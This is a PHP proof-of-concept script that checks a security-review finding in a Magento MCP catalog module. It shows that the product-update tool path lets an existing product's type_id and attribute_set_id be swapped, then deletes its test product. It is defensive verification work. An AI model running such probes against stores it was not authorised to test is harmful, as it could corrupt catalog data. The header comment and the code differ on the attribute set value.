<?php
/**
 * Live exploit verification for SECURITY_REVIEW_2026-05-26.md / Finding 1
 *
 * What this proves: catalog.product.update accepts arbitrary type_id and
 * attribute_set_id changes on an existing product, even though the admin
 * UI deliberately renders those fields read-only post-create. The MCP
 * tool wraps ProductRepositoryInterface::save() directly; the repository
 * has no model-level guard against type swap, so the saved row ends up
 * type-classified differently with zero variant / option / inventory
 * supporting rows.
 *
 * State mutations performed:
 *   1. Capture current value of catalog_product_entity.type_id for SKU
 *      "mcp-vuln-probe-001". If row exists, abort (manual cleanup needed).
 *   2. Create a fresh simple product via the same code path as
 *      catalog.product.create.
 *   3. Reload by SKU and invoke the MCP-tool field applier with
 *      {"type_id": "configurable", "attribute_set_id": 4}.
 *   4. Save via ProductRepositoryInterface (same as the tool does).
 *   5. Reload and report the persisted type_id / attribute_set_id.
 *   6. Permanently delete the test product via SecureAreaScope-wrapped
 *      ProductRepositoryInterface::delete().
 *   7. Verify the row no longer exists.
 */
declare(strict_types=1);

require __DIR__ . '/../../../../../bootstrap.php';

use Magento\Framework\App\Bootstrap;
use Magento\Catalog\Api\ProductRepositoryInterface;
use Magento\Catalog\Api\Data\ProductInterfaceFactory;
use Magento\Framework\Exception\NoSuchEntityException;
use Magebit\McpCatalogTools\Tool\Catalog\Product\ProductFieldApplier;
use Magebit\McpCatalogTools\Model\SecureAreaScope;

$bootstrap = Bootstrap::create(BP, $_SERVER);
$objectManager = $bootstrap->getObjectManager();

$state = $objectManager->get(\Magento\Framework\App\State::class);
$state->setAreaCode('adminhtml');

/** @var ProductRepositoryInterface $repo */
$repo = $objectManager->get(ProductRepositoryInterface::class);
/** @var ProductInterfaceFactory $factory */
$factory = $objectManager->get(ProductInterfaceFactory::class);
/** @var ProductFieldApplier $applier */
$applier = $objectManager->get(ProductFieldApplier::class);
/** @var SecureAreaScope $secureArea */
$secureArea = $objectManager->get(SecureAreaScope::class);

$sku = 'mcp-vuln-probe-001';

// Step 1 — pre-check: the SKU MUST NOT already exist
try {
    $existing = $repo->get($sku);
    fwrite(STDERR, "ABORT: SKU {$sku} already exists (entity_id=" . $existing->getId() . "). Manual cleanup required.\n");
    exit(2);
} catch (NoSuchEntityException) {
    // expected — proceed
}

echo "[1] pre-check OK: SKU {$sku} not present\n";

// Step 2 — create a fresh simple product via the same applier path catalog.product.create uses
$product = $factory->create();
$applier->applyOptional($product, [
    'sku' => $sku,
    'name' => 'MCP Vuln Probe',
    'attribute_set_id' => 4, // default attribute set
    'type_id' => 'simple',
    'status' => 1,
    'visibility' => 4,
    'price' => 9.99,
    'weight' => 1.0,
]);
$saved = $repo->save($product);
$createdId = (int) $saved->getId();
$createdType = (string) $saved->getTypeId();
$createdAttrSet = (int) $saved->getAttributeSetId();
echo "[2] created: id={$createdId} sku={$sku} type_id={$createdType} attribute_set_id={$createdAttrSet}\n";

// Step 3 + 4 — reload, run the patch path catalog.product.update uses
$reloaded = $repo->get($sku);
$applier->applyOptional($reloaded, [
    'type_id' => 'configurable',     // attempt to swap type — admin UI never lets you do this
    'attribute_set_id' => 9,          // attempt to swap attribute set on an existing entity
]);
$mutated = $repo->save($reloaded);
$mutatedType = (string) $mutated->getTypeId();
$mutatedAttrSet = (int) $mutated->getAttributeSetId();
echo "[3] post-update on the same in-memory object: type_id={$mutatedType} attribute_set_id={$mutatedAttrSet}\n";

// Step 5 — independently reload to confirm persisted on disk
$persisted = $repo->get($sku, false, null, true);
$persistedType = (string) $persisted->getTypeId();
$persistedAttrSet = (int) $persisted->getAttributeSetId();
echo "[4] FRESH RELOAD from repository: type_id={$persistedType} attribute_set_id={$persistedAttrSet}\n";

if ($persistedType !== $createdType) {
    echo "*** CONFIRMED: type_id mutated from '{$createdType}' to '{$persistedType}' via catalog.product.update path ***\n";
}
if ($persistedAttrSet !== $createdAttrSet) {
    echo "*** CONFIRMED: attribute_set_id mutated from {$createdAttrSet} to {$persistedAttrSet} via catalog.product.update path ***\n";
}

// Step 6 — clean up: permanently delete the probe row through the same SecureAreaScope path the tool uses
$secureArea->run(function () use ($repo, $persisted) {
    $repo->delete($persisted);
});
echo "[5] cleanup: deleted probe entity_id={$createdId}\n";

// Step 7 — verify gone
try {
    $repo->get($sku);
    fwrite(STDERR, "WARNING: probe still resolvable after delete — manual cleanup may be required\n");
    exit(3);
} catch (NoSuchEntityException) {
    echo "[6] cleanup verified: SKU {$sku} no longer exists\n";
}

echo "DONE: all state restored\n";
